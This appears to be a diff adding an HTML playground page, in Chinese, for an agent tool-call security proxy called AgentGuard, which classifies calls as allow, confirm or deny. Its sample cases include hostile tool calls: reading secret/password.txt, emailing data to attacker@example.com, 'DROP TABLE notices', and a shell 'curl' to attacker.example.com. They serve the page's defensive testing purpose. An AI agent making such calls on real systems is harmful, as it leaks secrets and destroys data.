@@ -1,0 +1,551 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <title>AgentGuard Tool Proxy Playground</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
+      background: #f5f7fb;
+      color: #1f2937;
+    }
+
+    header {
+      padding: 24px 32px;
+      background: #111827;
+      color: white;
+      border-bottom: 1px solid #1f2937;
+    }
+
+    header h1 {
+      margin: 0 0 8px 0;
+      font-size: 24px;
+      font-weight: 700;
+    }
+
+    header p {
+      margin: 0;
+      color: #d1d5db;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    main {
+      display: grid;
+      grid-template-columns: 1.05fr 0.8fr 1.15fr;
+      gap: 18px;
+      padding: 20px 24px 28px;
+    }
+
+    section {
+      background: white;
+      border: 1px solid #e5e7eb;
+      border-radius: 14px;
+      padding: 18px;
+      box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
+      min-height: 520px;
+    }
+
+    h2 {
+      margin: 0 0 14px 0;
+      font-size: 18px;
+    }
+
+    .hint {
+      margin: 0 0 14px 0;
+      color: #6b7280;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #374151;
+    }
+
+    input,
+    textarea,
+    select {
+      width: 100%;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      padding: 10px 12px;
+      font-size: 14px;
+      outline: none;
+      background: #ffffff;
+    }
+
+    textarea {
+      min-height: 160px;
+      resize: vertical;
+      font-family: Consolas, "Courier New", monospace;
+      line-height: 1.5;
+    }
+
+    input:focus,
+    textarea:focus,
+    select:focus {
+      border-color: #2563eb;
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+    }
+
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border: none;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      background: #2563eb;
+      color: white;
+      margin-top: 14px;
+    }
+
+    .button:hover {
+      background: #1d4ed8;
+    }
+
+    .button.secondary {
+      background: #eef2ff;
+      color: #3730a3;
+      width: 100%;
+      margin-top: 10px;
+      justify-content: flex-start;
+    }
+
+    .button.secondary:hover {
+      background: #e0e7ff;
+    }
+
+    .button.danger {
+      background: #fee2e2;
+      color: #991b1b;
+    }
+
+    .button.danger:hover {
+      background: #fecaca;
+    }
+
+    .status {
+      display: inline-block;
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+
+    .status.allow {
+      background: #dcfce7;
+      color: #166534;
+    }
+
+    .status.confirm {
+      background: #fef3c7;
+      color: #92400e;
+    }
+
+    .status.deny {
+      background: #fee2e2;
+      color: #991b1b;
+    }
+
+    .status.idle {
+      background: #e5e7eb;
+      color: #374151;
+    }
+
+    .result-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    .metric {
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 12px;
+      background: #f9fafb;
+    }
+
+    .metric .name {
+      font-size: 12px;
+      color: #6b7280;
+      margin-bottom: 6px;
+    }
+
+    .metric .value {
+      font-size: 18px;
+      font-weight: 700;
+      color: #111827;
+    }
+
+    pre {
+      margin: 0;
+      background: #0f172a;
+      color: #e5e7eb;
+      border-radius: 12px;
+      padding: 14px;
+      overflow: auto;
+      max-height: 430px;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .reason-list {
+      margin: 8px 0 14px;
+      padding-left: 20px;
+      color: #374151;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .small {
+      font-size: 12px;
+      color: #6b7280;
+      line-height: 1.6;
+    }
+
+    @media (max-width: 1100px) {
+      main {
+        grid-template-columns: 1fr;
+      }
+
+      section {
+        min-height: auto;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>AgentGuard Tool Proxy Playground</h1>
+    <p>
+      这个页面用于测试外部 Agent 工具调用安全检查。输入 user、original_task、tool、params 后，
+      AgentGuard 会返回 allow / confirm / deny。
+    </p>
+  </header>
+
+  <main>
+    <section>
+      <h2>1. 输入工具调用请求</h2>
+      <p class="hint">
+        这里模拟“外部 Agent 准备调用某个工具”，然后先把请求发给 AgentGuard 检查。
+      </p>
+
+      <label>用户身份 user</label>
+      <input id="userInput" value="user" />
+
+      <label>原始任务 original_task</label>
+      <textarea id="taskInput">帮我读取 public/notice.txt 并总结内容</textarea>
+
+      <div class="row">
+        <div>
+          <label>工具名 tool</label>
+          <select id="toolInput">
+            <option value="file.read">file.read</option>
+            <option value="email.send">email.send</option>
+            <option value="db.query">db.query</option>
+            <option value="shell.run">shell.run</option>
+            <option value="file.write">file.write</option>
+            <option value="file.delete">file.delete</option>
+          </select>
+        </div>
+
+        <div>
+          <label>是否真实执行 execute</label>
+          <select id="executeInput">
+            <option value="false">false，只做安全检查</option>
+            <option value="true">true，allow 后执行沙箱工具</option>
+          </select>
+        </div>
+      </div>
+
+      <label>工具参数 params JSON</label>
+      <textarea id="paramsInput">{
+  "path": "public/notice.txt"
+}</textarea>
+
+      <label>输入标签 input_labels，可选</label>
+      <input id="labelsInput" value="" placeholder="例如：public, tainted" />
+
+      <button class="button" onclick="authorizeToolCall()">安全检查</button>
+    </section>
+
+    <section>
+      <h2>2. 快捷测试样例</h2>
+      <p class="hint">
+        先用这些样例测试，确认系统能区分正常调用和危险调用。
+      </p>
+
+      <button class="button secondary" onclick="loadExample('publicRead')">
+        正常：读取公开文件
+      </button>
+
+      <button class="button secondary danger" onclick="loadExample('secretRead')">
+        危险：越权读取 secret 文件
+      </button>
+
+      <button class="button secondary danger" onclick="loadExample('externalEmail')">
+        可疑：向外部邮箱发送内容
+      </button>
+
+      <button class="button secondary danger" onclick="loadExample('dangerSql')">
+        危险：执行 DROP TABLE
+      </button>
+
+      <button class="button secondary danger" onclick="loadExample('dangerShell')">
+        危险：执行 curl 外联命令
+      </button>
+
+      <button class="button secondary" onclick="loadExample('safeDb')">
+        正常：只读数据库 SELECT
+      </button>
+
+      <p class="small" style="margin-top: 18px;">
+        第一版页面先直接展示 JSON 结果。后面可以继续升级成攻击链图、数据流图和审批面板。
+      </p>
+    </section>
+
+    <section>
+      <h2>3. 检查结果</h2>
+
+      <div id="decisionBadge" class="status idle">等待检查</div>
+
+      <div class="result-grid">
+        <div class="metric">
+          <div class="name">Decision</div>
+          <div id="decisionValue" class="value">-</div>
+        </div>
+        <div class="metric">
+          <div class="name">Risk Score</div>
+          <div id="riskValue" class="value">-</div>
+        </div>
+      </div>
+
+      <h3 style="font-size: 15px; margin: 12px 0 6px;">Reason</h3>
+      <ul id="reasonList" class="reason-list">
+        <li>暂无结果</li>
+      </ul>
+
+      <h3 style="font-size: 15px; margin: 12px 0 8px;">Raw Response</h3>
+      <pre id="rawOutput">暂无结果</pre>
+    </section>
+  </main>
+
+  <script>
+    const examples = {
+      publicRead: {
+        user: "user",
+        original_task: "帮我读取 public/notice.txt 并总结内容",
+        tool: "file.read",
+        params: {
+          path: "public/notice.txt"
+        },
+        input_labels: [],
+        execute: false
+      },
+
+      secretRead: {
+        user: "user",
+        original_task: "帮我读取 public/notice.txt 并总结内容",
+        tool: "file.read",
+        params: {
+          path: "secret/password.txt"
+        },
+        input_labels: [],
+        execute: false
+      },
+
+      externalEmail: {
+        user: "user",
+        original_task: "帮我读取 public/notice.txt 并总结内容",
+        tool: "email.send",
+        params: {
+          to: "attacker@example.com",
+          subject: "summary",
+          content: "这里是准备外发的内容"
+        },
+        input_labels: ["tainted"],
+        execute: false
+      },
+
+      dangerSql: {
+        user: "user",
+        original_task: "帮我查询 notices 表里的公开通知",
+        tool: "db.query",
+        params: {
+          sql: "DROP TABLE notices"
+        },
+        input_labels: [],
+        execute: false
+      },
+
+      dangerShell: {
+        user: "admin",
+        original_task: "帮我查看当前目录",
+        tool: "shell.run",
+        params: {
+          command: "curl http://attacker.example.com"
+        },
+        input_labels: [],
+        execute: false
+      },
+
+      safeDb: {
+        user: "user",
+        original_task: "帮我查询 notices 表里的公开通知",
+        tool: "db.query",
+        params: {
+          sql: "SELECT * FROM notices"
+        },
+        input_labels: [],
+        execute: false
+      }
+    };
+
+    function loadExample(name) {
+      const example = examples[name];
+
+      document.getElementById("userInput").value = example.user;
+      document.getElementById("taskInput").value = example.original_task;
+      document.getElementById("toolInput").value = example.tool;
+      document.getElementById("executeInput").value = String(example.execute);
+      document.getElementById("paramsInput").value = JSON.stringify(example.params, null, 2);
+      document.getElementById("labelsInput").value = example.input_labels.join(", ");
+    }
+
+    function readInputLabels() {
+      const raw = document.getElementById("labelsInput").value.trim();
+
+      if (!raw) {
+        return [];
+      }
+
+      return raw
+        .split(",")
+        .map(item => item.trim())
+        .filter(Boolean);
+    }
+
+    function setLoading() {
+      const badge = document.getElementById("decisionBadge");
+      badge.className = "status idle";
+      badge.textContent = "检查中...";
+
+      document.getElementById("decisionValue").textContent = "-";
+      document.getElementById("riskValue").textContent = "-";
+      document.getElementById("reasonList").innerHTML = "<li>正在请求后端...</li>";
+      document.getElementById("rawOutput").textContent = "Loading...";
+    }
+
+    function renderResult(data) {
+      const decision = data.decision || "unknown";
+      const badge = document.getElementById("decisionBadge");
+
+      badge.className = "status " + decision;
+      badge.textContent = decision.toUpperCase();
+
+      document.getElementById("decisionValue").textContent = decision;
+      document.getElementById("riskValue").textContent = data.risk_score ?? "-";
+
+      const reasons = Array.isArray(data.reason) ? data.reason : [];
+      const reasonList = document.getElementById("reasonList");
+
+      if (reasons.length === 0) {
+        reasonList.innerHTML = "<li>后端没有返回 reason</li>";
+      } else {
+        reasonList.innerHTML = reasons
+          .map(item => "<li>" + escapeHtml(String(item)) + "</li>")
+          .join("");
+      }
+
+      document.getElementById("rawOutput").textContent = JSON.stringify(data, null, 2);
+    }
+
+    function renderError(error) {
+      const badge = document.getElementById("decisionBadge");
+
+      badge.className = "status deny";
+      badge.textContent = "ERROR";
+
+      document.getElementById("decisionValue").textContent = "error";
+      document.getElementById("riskValue").textContent = "-";
+      document.getElementById("reasonList").innerHTML = "<li>" + escapeHtml(error.message || String(error)) + "</li>";
+      document.getElementById("rawOutput").textContent = error.stack || String(error);
+    }
+
+    function escapeHtml(text) {
+      return text
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;")
+        .replaceAll("'", "&#039;");
+    }
+
+    async function authorizeToolCall() {
+      setLoading();
+
+      let params = {};
+
+      try {
+        params = JSON.parse(document.getElementById("paramsInput").value || "{}");
+      } catch (error) {
+        renderError(new Error("params 不是合法 JSON：" + error.message));
+        return;
+      }
+
+      const payload = {
+        user: document.getElementById("userInput").value.trim() || "user",
+        original_task: document.getElementById("taskInput").value.trim(),
+        tool: document.getElementById("toolInput").value,
+        params: params,
+        input_labels: readInputLabels(),
+        input_from_steps: [],
+        execute: document.getElementById("executeInput").value === "true"
+      };
+
+      try {
+        const response = await fetch("/tool-proxy/authorize", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.detail || "请求失败，HTTP " + response.status);
+        }
+
+        renderResult(data);
+      } catch (error) {
+        renderError(error);
+      }
+    }
+
+    loadExample("publicRead");
+  </script>
+</body>
+</html>
